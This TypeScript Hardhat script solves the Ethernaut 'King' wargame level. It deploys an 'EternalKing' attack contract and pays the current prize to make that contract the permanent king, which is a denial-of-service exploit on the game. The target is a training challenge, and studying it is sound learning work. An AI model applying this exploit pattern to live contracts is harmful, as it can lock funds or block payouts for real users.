import { ethers } from "hardhat";
// import { expect } from "chai";
// import { Wallet } from "ethers";
// import { HardhatRuntimeEnvironment } from "hardhat/types";
// import deployContract from "../deploy/deployGeneric";
import { run } from "hardhat";

const attackVault = async () => {
    // change contract addresses here.
    const kingAddress = "0x3acAB497d1474153706206d5094805e9c047123F"; //type "await contract.address()" in ethernaut console
    const args: any[] = [];
    const deployer = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below 🚀
    // Vulnerability comes from the possibility of making a malicious contract the king
    // Additional read to understand more on recieve and transfer to make the contract needed:
    // https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity/81995
    // https://docs.soliditylang.org/en/v0.8.10/types.html#members-of-addresses

    // deploying attack contract here
    // const deployed = await deployContract(hre, "EternalKing", args);
    // alternative below
    console.log("Deploying attack contract eternalKing...");
    const attack = await (await ethers.getContractFactory("EternalKing", deployer)).deploy();
    console.log(attack);
    console.log(`Attack contract deployed to ${attack.address}`);
    // experimantal verify below
    // if (eternalKing.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: eternalKing.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }

    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            constant: true,
            inputs: [],
            name: "_king",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            payable: undefined,
            stateMutability: "view",
            type: "function",
        },
        {
            constant: true,
            inputs: [],
            name: "prize",
            outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
            payable: undefined,
            stateMutability: "view",
            type: "function",
        },
        {
            constant: undefined,
            inputs: [],
            name: "owner",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            payable: undefined,
            stateMutability: "nonpayable",
            type: "function",
        },
    ];
    const contract = await ethers.getContractAt(ABI, kingAddress);
    console.log("Checking current King and Prize...");
    let king = await contract._king();
    let prize = await contract.prize();
    let prizeC = ethers.utils.formatEther(prize);
    console.log(`Current King is: ${king}`);
    console.log(`Current Prize is: ${prizeC}`);
    console.log("Making EternalKing Contract as the new king...");
    const tx1 = await attack.claimKingship(kingAddress, { value: prize });
    const tx1Receipt = await tx1.wait();
    console.log(tx1Receipt);
    //TODO: check king can't be reclaimed
    // const provider = await ethers.getDefaultProvider("goerli");
    // /*Private Keys in .env file or hardcode here*/
    // const PRIVATE_KEY = process.env.PRIVATE_KEY || "";
    // const wallet = new Wallet(PRIVATE_KEY, provider);
    // const fail = await expect(
    //     wallet.sendTransaction({
    //         from: player,
    //         value: prize,
    //     })
    // ).to.be.reverted;
    // console.log(`Transaction Failed?: ${fail}`);
    // if (fail) {
    //     console.log("Done, Submit to ethernaut.");
    // } else {
    //     console.log("Review code and try again...");
    // }
    console.log("Done, Submit to ethernaut.");
};

attackVault()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
